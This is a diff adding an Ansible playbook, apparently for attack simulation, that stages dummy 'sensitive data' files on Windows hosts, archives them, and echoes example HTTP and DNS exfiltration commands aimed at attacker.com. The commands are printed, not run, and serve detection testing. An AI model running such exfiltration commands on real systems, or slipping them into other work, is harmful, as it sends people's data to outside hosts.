@@ -1,0 +1,57 @@
+---
+- name: Enhanced Data Exfiltration
+  hosts: windows
+  gather_facts: yes
+  vars:
+    attack_log_dir: "C:\\AttackSimulation\\Exfiltration"
+  tasks:
+    - name: Create attack log directory
+      win_file:
+        path: "{{ attack_log_dir }}"
+        state: directory
+
+    - name: Simulate Data Exfiltration Techniques
+      win_shell: |
+        Write-Host "[+] Starting data exfiltration simulation"
+        Write-Host "[+] MITRE ATT&CK: T1041, T1074"
+        Write-Host "[+] Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        
+        $attackLogDir = "{{ attack_log_dir }}"
+        
+        # Test 1: Data staging
+        Write-Host "`n=== Test 1: Data Staging ==="
+        $stagingDir = "$attackLogDir\staging"
+        New-Item -ItemType Directory -Path $stagingDir -Force
+        
+        # Create test files
+        1..10 | ForEach-Object { 
+            $fileName = "$stagingDir\sensitive_data_$_.txt"
+            Set-Content -Path $fileName -Value "Sensitive data sample $_"
+        }
+        
+        # Test 2: Archive creation
+        Write-Host "`n=== Test 2: Archive Creation ==="
+        $archivePath = "$attackLogDir\exfiltration_archive.zip"
+        Compress-Archive -Path "$stagingDir\*" -DestinationPath $archivePath
+        Write-Host "Created archive: $archivePath"
+        
+        # Test 3: Exfiltration simulation
+        Write-Host "`n=== Test 3: Exfiltration Methods ==="
+        Write-Host "HTTP exfiltration simulation:"
+        Write-Host "Command: Invoke-WebRequest -Uri 'http://attacker.com/upload' -Method POST -InFile $archivePath"
+        
+        Write-Host "`nDNS exfiltration simulation:"
+        Write-Host "Command: nslookup sensitive_data.attacker.com"
+        
+        # Save results
+        $results = @{
+            "TestTimestamp" = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            "StagingDir" = $stagingDir
+            "ArchivePath" = $archivePath
+            "SimulatedMethods" = @("HTTP", "DNS")
+        }
+        
+        $results | ConvertTo-Json | Out-File "$attackLogDir\exfiltration_results.json"
+        Write-Host "`n[+] Data exfiltration simulation completed"
+      register: exfiltration_results
+      ignore_errors: yes
